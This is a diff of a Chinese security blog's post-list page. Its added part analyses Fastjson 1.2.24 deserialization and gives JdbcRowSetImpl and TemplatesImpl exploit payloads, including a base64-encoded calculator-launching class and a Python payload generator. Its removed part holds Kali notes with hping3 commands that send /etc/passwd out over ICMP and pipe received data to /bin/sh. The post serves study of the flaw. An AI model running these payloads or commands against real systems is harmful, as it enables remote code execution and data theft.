@@ -29,7 +29,144 @@ var CONFIG = {
 };
 
 window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="J1an's Little World" type="application/atom+xml">
-</head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">首页</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">归档</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">标签</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/links/"><span class="header-nav-menu-item__icon"><i class="fas fa-user-friends"></i></span><span class="header-nav-menu-item__text">友链</span></a></div></div><div class="header-nav-search"><span class="header-nav-search__icon"><i class="fas fa-search"></i></span><span class="header-nav-search__text">搜索</span></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">J1an's Little World</div><div class="header-banner-info__subtitle">欢迎来学习知识</div></div><div class="header-banner-arrow"><div class="header-banner-arrow__icon"><i class="fas fa-angle-down"></i></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content content-home" id="content"><section class="postlist"><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/posts/d8454e42.html">Hibernate链分析</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2022-11-24</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2022-11-29</span></span><span class="post-meta-item post-meta-item--visitors leancloud_visitors" id="/posts/d8454e42.html" data-flag-title="Hibernate链分析"><span class="post-meta-item__icon"><i class="fas fa-eye"></i></span><span class="post-meta-item__info">阅读次数</span><span class="post-meta-item__value leancloud-visitors-count"></span></span></div></header><div class="post-body"><div class="post-excerpt">
+</head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">首页</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">归档</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">标签</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/links/"><span class="header-nav-menu-item__icon"><i class="fas fa-user-friends"></i></span><span class="header-nav-menu-item__text">友链</span></a></div></div><div class="header-nav-search"><span class="header-nav-search__icon"><i class="fas fa-search"></i></span><span class="header-nav-search__text">搜索</span></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">J1an's Little World</div><div class="header-banner-info__subtitle">欢迎来学习知识</div></div><div class="header-banner-arrow"><div class="header-banner-arrow__icon"><i class="fas fa-angle-down"></i></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content content-home" id="content"><section class="postlist"><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/posts/94f1bd4a.html">Fastjson反序列化分析</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2022-11-29</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2022-12-13</span></span><span class="post-meta-item post-meta-item--visitors leancloud_visitors" id="/posts/94f1bd4a.html" data-flag-title="Fastjson反序列化分析"><span class="post-meta-item__icon"><i class="fas fa-eye"></i></span><span class="post-meta-item__info">阅读次数</span><span class="post-meta-item__value leancloud-visitors-count"></span></span></div></header><div class="post-body"><div class="post-excerpt"><p>在进行fastjson反序列化前，我们要先看看为什么fastjson解析会有反序列化的漏洞，我们先来做一个正常的类，并对其使用json解析，这里我们使用1.2.24版本作为演示</p>
+<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>com.alibaba<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>fastjson<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>1.2.24<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>首先来一个正常一点的用户类（符合JavaBean要求）</p>
+<pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">package org.example;
+public class User &#123;
+    private String username;
+    private String password;
+    public User(String username,String password)&#123;
+        this.username&#x3D;username;
+        this.password&#x3D;password;
+    &#125;
+    public User() &#123;
+    &#125;
+
+    public String getUsername() &#123;
+        System.out.println(&quot;getUsername&quot;);
+        return username;
+    &#125;
+    public void setUsername(String username) &#123;
+        System.out.println(&quot;setUsername&quot;);
+        this.username &#x3D; username;
+    &#125;
+    public String getPassword() &#123;
+        System.out.println(&quot;getPassword&quot;);
+        return password;
+    &#125;
+    public void setPassword(String password) &#123;
+        System.out.println(&quot;setPassword&quot;);
+        this.password &#x3D; password;
+    &#125;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>写个test调用一下</p>
+<pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">package org.example;
+
+import com.alibaba.fastjson.JSON;
+
+public class test &#123;
+    public static void main(String[] args) &#123;
+        User user&#x3D;new User(&quot;Jlan&quot;,&quot;FXXKpassword&quot;);
+        String json&#x3D; JSON.toJSONString(user);
+        System.out.println(json);
+    &#125;
+&#125;
+&#x2F;&#x2F;getPassword
+&#x2F;&#x2F;getUsername
+&#x2F;&#x2F;&#123;&quot;password&quot;:&quot;FXXKpassword&quot;,&quot;username&quot;:&quot;Jlan&quot;&#125;
+&#x2F;&#x2F;输出结果可见调用了getter方法<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>我们再来看三种不同的解析方法会对类做什么处理</p>
+<p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202212110241070.png"></p>
+<p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202212110242083.png"></p>
+<p>可以看到除了我们指定好类的情况下变量为对应的类，剩下的情况都是JSONObject类（废话），那我们在来看看在json中加入@type参数是什么效果</p>
+<p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202212110247830.png"></p>
+<p>可以看到这次parse方法和指定类的parseObject方法都转换出了正确的类并且调用了setter方法，但是不指定类的parseObject方法却先调用了setter方法后调用了getter方法，这是为什么呢，我们跟入其源码看一下</p>
+<pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">public static JSONObject parseObject(String text) &#123;
+    Object obj &#x3D; parse(text);
+    return obj instanceof JSONObject ? (JSONObject)obj : (JSONObject)toJSON(obj);
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>可以看到其先调用了parse方法（setter被调用），然后判断这个对象是否是JSONObject对象，如果不是就调用toJSON将其转为JSONObject（getter被调用）</p>
+<p>那现在又有一个问题，如果@type和parseObject传入的类不相同怎么办，我们先建立一个和User完全一致的Users类（名字不一样哈）</p>
+<p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202212110253552.png"></p>
+<p>意料之中，直接报错（大家也可以试试使用Object.class，这是成功的，怀疑是先进行prase再尝试进行转换）</p>
+<p>那么下面我们来看这个版本利用的两条getter或setter链</p>
+
+        <h3 id="com-sun-rowset-JdbcRowSetImpl"   >
+          <a href="#com-sun-rowset-JdbcRowSetImpl" class="heading-link"><i class="fas fa-link"></i></a><a href="#com-sun-rowset-JdbcRowSetImpl" class="headerlink" title="com.sun.rowset.JdbcRowSetImpl"></a>com.sun.rowset.JdbcRowSetImpl</h3>
+      <pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"com.sun.rowset.JdbcRowSetImpl"</span><span class="token punctuation">,</span><span class="token property">"dataSourceName"</span><span class="token operator">:</span><span class="token string">"rmi://127.0.0.1:1099/badClassName"</span><span class="token punctuation">,</span> <span class="token property">"autoCommit"</span><span class="token operator">:</span><span class="token boolean">true</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>这就是反序列化的关键类了，我们跟入看看里面的内容，由于在进行json解析的时候调用的是setter方法，那么我们就在上面两个属性的set方法上打断点</p>
+<p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202212130001274.png"></p>
+<p>对于<code>dataSourceName</code>没什么，就是一个单纯的设定了一下属性，我们继续看autoCommit</p>
+<p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202212130002735.png"></p>
+<p>这里的set首先对conn的状态进行了判定，如果现在有一个连接那么就直接调用conn属性的setAutoCommit方法，反之就要先调用本对象的connect方法，我们跟入看看</p>
+<p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202212130004659.png"></p>
+<p>首先尝试获取DataSourceName的内容，并对其执行lookup方法，而lookup方法就是用于远程加载类的，所以此时我们的恶意类就被加载进去了，实现RCE</p>
+
+        <h3 id="com-sun-org-apache-xalan-internal-xsltc-trax-TemplatesImpl"   >
+          <a href="#com-sun-org-apache-xalan-internal-xsltc-trax-TemplatesImpl" class="heading-link"><i class="fas fa-link"></i></a><a href="#com-sun-org-apache-xalan-internal-xsltc-trax-TemplatesImpl" class="headerlink" title="com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"></a>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</h3>
+      <p>又来了，字节码加载又来了</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span></span><span class="token class-name">DOM</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span></span><span class="token class-name">TransletException</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>runtime<span class="token punctuation">.</span></span><span class="token class-name">AbstractTranslet</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>dtm<span class="token punctuation">.</span></span><span class="token class-name">DTMAxisIterator</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>serializer<span class="token punctuation">.</span></span><span class="token class-name">SerializationHandler</span></span><span class="token punctuation">;</span>
+
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TEMPOC</span> <span class="token keyword">extends</span> <span class="token class-name">AbstractTranslet</span> <span class="token punctuation">&#123;</span>
+
+    <span class="token keyword">public</span> <span class="token function">TEMPOC</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>
+        <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"open -a Calculator"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token annotation punctuation">@Override</span>
+    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">DOM</span> document<span class="token punctuation">,</span> <span class="token class-name">DTMAxisIterator</span> iterator<span class="token punctuation">,</span> <span class="token class-name">SerializationHandler</span> handler<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token annotation punctuation">@Override</span>
+    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">DOM</span> document<span class="token punctuation">,</span> <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>serializer<span class="token punctuation">.</span></span>SerializationHandler</span><span class="token punctuation">[</span><span class="token punctuation">]</span> haFndlers<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">TransletException</span> <span class="token punctuation">&#123;</span>
+
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
+        <span class="token class-name">TEMPOC</span> t <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TEMPOC</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64
+
+fin <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">r"TEMPOC.class"</span><span class="token punctuation">,</span><span class="token string">"rb"</span><span class="token punctuation">)</span>
+byte <span class="token operator">=</span> fin<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
+fout <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>byte<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>
+poc <span class="token operator">=</span> <span class="token string">'&#123;"@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl","_bytecodes":["%s"],"_name":"a.b","_tfactory":&#123;&#125;,"_outputProperties":&#123; &#125;,"_version":"1.0","allowedProtocols":"all"&#125;'</span><span class="token operator">%</span> fout
+<span class="token keyword">print</span> poc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span><span class="token punctuation">,</span><span class="token property">"_bytecodes"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token string">"yv66vgAAADQAJgoABwAXCgAYABkIABoKABgAGwcAHAoABQAXBwAdAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACkV4Y2VwdGlvbnMHAB4BAAl0cmFuc2Zvcm0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWBwAfAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYHACABAApTb3VyY2VGaWxlAQALVEVNUE9DLmphdmEMAAgACQcAIQwAIgAjAQASb3BlbiAtYSBDYWxjdWxhdG9yDAAkACUBAAZURU1QT0MBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAHAAAAAAAEAAEACAAJAAIACgAAAC4AAgABAAAADiq3AAG4AAISA7YABFexAAAAAQALAAAADgADAAAACwAEAAwADQANAAwAAAAEAAEADQABAA4ADwABAAoAAAAZAAAABAAAAAGxAAAAAQALAAAABgABAAAAEQABAA4AEAACAAoAAAAZAAAAAwAAAAGxAAAAAQALAAAABgABAAAAFgAMAAAABAABABEACQASABMAAgAKAAAAJQACAAIAAAAJuwAFWbcABkyxAAAAAQALAAAACgACAAAAGQAIABoADAAAAAQAAQAUAAEAFQAAAAIAFg=="</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token property">"_name"</span><span class="token operator">:</span><span class="token string">"a.b"</span><span class="token punctuation">,</span><span class="token property">"_tfactory"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token property">"_outputProperties"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token property">"_version"</span><span class="token operator">:</span><span class="token string">"1.0"</span><span class="token punctuation">,</span><span class="token property">"allowedProtocols"</span><span class="token operator">:</span><span class="token string">"all"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+
+
+
+
+
+
+
+
+
+        <h2 id="1-2-24"   >
+          <a href="#1-2-24" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-2-24" class="headerlink" title="1.2.24"></a>1.2.24</h2>
+      <script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css"></div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/posts/d8454e42.html">Hibernate链分析</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2022-11-24</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2022-11-29</span></span><span class="post-meta-item post-meta-item--visitors leancloud_visitors" id="/posts/d8454e42.html" data-flag-title="Hibernate链分析"><span class="post-meta-item__icon"><i class="fas fa-eye"></i></span><span class="post-meta-item__info">阅读次数</span><span class="post-meta-item__value leancloud-visitors-count"></span></span></div></header><div class="post-body"><div class="post-excerpt">
         <h1 id="Hibernate"   >
           <a href="#Hibernate" class="heading-link"><i class="fas fa-link"></i></a><a href="#Hibernate" class="headerlink" title="Hibernate"></a>Hibernate</h1>
       
@@ -1504,227 +1641,7 @@ reg add <span class="token string">"HKLM\SYSTEM\CURRENT\CONTROLSET\CONTROL\TERMI
 <p>可以看到域中密码使用策略，在爆破时防止我们生成无效的密码字典</p>
 </li>
 </ul>
-<script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css"></div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/posts/8b8ae737.html">Kali从0到1</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2022-09-30</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2022-10-02</span></span><span class="post-meta-item post-meta-item--visitors leancloud_visitors" id="/posts/8b8ae737.html" data-flag-title="Kali从0到1"><span class="post-meta-item__icon"><i class="fas fa-eye"></i></span><span class="post-meta-item__info">阅读次数</span><span class="post-meta-item__value leancloud-visitors-count"></span></span></div></header><div class="post-body"><div class="post-excerpt">
-        <h1 id="工具大全"   >
-          <a href="#工具大全" class="heading-link"><i class="fas fa-link"></i></a><a href="#工具大全" class="headerlink" title="工具大全"></a>工具大全</h1>
-      
-        <h2 id="信息收集"   >
-          <a href="#信息收集" class="heading-link"><i class="fas fa-link"></i></a><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2>
-      
-        <h3 id="存活主机识别"   >
-          <a href="#存活主机识别" class="heading-link"><i class="fas fa-link"></i></a><a href="#存活主机识别" class="headerlink" title="存活主机识别"></a>存活主机识别</h3>
-      <ul>
-<li><p><strong>arping</strong>：</p>
-<ul>
-<li>类似于ping，也是用来探测存活的，不过使用的arp协议不是ICMP协议，所以只能探测内网不能碰公网</li>
-<li>-t参数可以添加mac地址，来保证IP地址绑定到了指定的MAC地址上</li>
-<li>还行吧，可能ping不管用的时候可以用，哦还可以用来捞mac地址</li>
-</ul>
-</li>
-<li><p><strong>fping</strong>：</p>
-<ul>
-<li><p>ping的加强版，fping可以在命令行中指定要ping的主机范围</p>
-</li>
-<li><p>与ping要等待某一主机连接超时或发回反馈信息不同，fping给一个主机发送完数据包后，马上给下一个主机发送数据包，实现多主机同时ping。如果某一主机ping通，则此主机将被打上标记，并从等待列表中移除，如果没ping通，说明主机无法到达，主机仍然留在等待列表中，等待后续操作。</p>
-</li>
-<li><p>```shell<br>fping IP1 IP2 IP3 …<br>fping -f filename<br>fping -g IP1 IP2<br>可以添加-a参数来只显示存活主机</p>
-<pre class="line-numbers language-none"><code class="language-none">
-  - ping的升级版（自己写歌脚本貌似也差不多）
-
-- **hping3**：
-
-  - hping是安全审计、防火墙测试等工作的标配工具。hping优势在于能够定制数据包的各个部分，因此用户可以灵活对目标机进行细致地探测。
-
-  - 可以自己定制数据包来探测防火墙，也可以详细查看响应来判断拦截等内容，甚至可以用来伪造ICMP包来打DDOS
-
-  - &#96;&#96;&#96;
-    -a 指定包的请求IP，可以指定为目标来让自己反复ping自己，不过这样的话自己也就收不到响应数据了
-    -p 指定端口
-    -I 指定网卡
-    -c 指定发包次数<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
-<li><p><strong>文件传输</strong></p>
-<ul>
-<li><p>Hping3支持通过TCP/UDP/ICMP等包来进行文件传输。相当于借助TCP/UDP/ICMP包建立隐秘隧道通讯。实现方式是开启监听端口，对检测到的签名（签名为用户指定的字符串）的内容进行相应的解析。在接收端开启服务：</p>
-</li>
-<li><p>```shell<br>hping3 源IP –listen signature –safe  –icmp</p>
-<pre class="line-numbers language-none"><code class="language-none">
-- 监听ICMP包中的签名，根据签名解析出文件内容。
-
-- 在发送端使用签名打包的ICMP包发送文件：
-
-- &#96;&#96;&#96;shell
-  hping3 目标IP --icmp -d 100 --sign signature --file &#x2F;etc&#x2F;passwd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
-<li><p>将<code>/etc/passwd</code>密码文件通过ICMP包传给目标主机。发送包大小为100字节（-d 100），发送签名为signature(-sign signature)。</p>
-</li>
-</ul>
-</li>
-<li><p><strong>反弹shell功能</strong></p>
-<ul>
-<li><p>如果Hping3能够在远程主机上启动，那么可以作为木马程序启动监听端口，并在建立连接后打开shell通信。与netcat的后门功能类似。</p>
-</li>
-<li><p>示例：本地打开53号UDP端口（DNS解析服务）监听来自192.168.10.66主机的包含签名为signature的数据包，并将收到的数据调用/bin/sh执行。</p>
-</li>
-<li><p>在木马启动端：</p>
-</li>
-<li><p>```<br>hping3 192.168.10.66–listen signature –safe –udp -p 53 | /bin/sh</p>
-<pre class="line-numbers language-none"><code class="language-none">
-- 在远程控制端：
-
-- &#96;&#96;&#96;
-  echo ls &gt;test.cmd hping3 192.168.10.44 -p53 -d 100 --udp --sign siganature --file .&#x2F;test.cmd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
-<li><p>将包含ls命令的文件加上签名signature发送到192.168.10.44主机的53号UDP端口，包数据长度为100字节。</p>
-</li>
-<li><p>当然这里只是简单的演示程序，真实的场景，控制端可以利益shell执行很多的高级复杂的操作。</p>
-</li>
-</ul>
-</li>
-<li><p>好高级的说，可以自定义的部分也很多，也有一些有趣的应用，可冲</p>
-</li>
-</ul>
-</li>
-<li><p><strong>masscan</strong>：</p>
-<ul>
-<li><p>又一个扫描工具，给个例子就过，好快啊</p>
-</li>
-<li><p>```<br>masscan -p80,8080-8100 10.0.0.0/8<br>（扫描10.x.x.x子网，扫描端口80和8000-8100范围的端口段）<br>可使用–echo把当前配置输出到文件，-c使用文件<br>–source-ip 指定源IP<br>–excludefile 文件 指定网段忽略<br>–max-rate 100000 最高发包速率<br>–banners 获取banner信息，支持少量的协议</p>
-<pre class="line-numbers language-none"><code class="language-none">
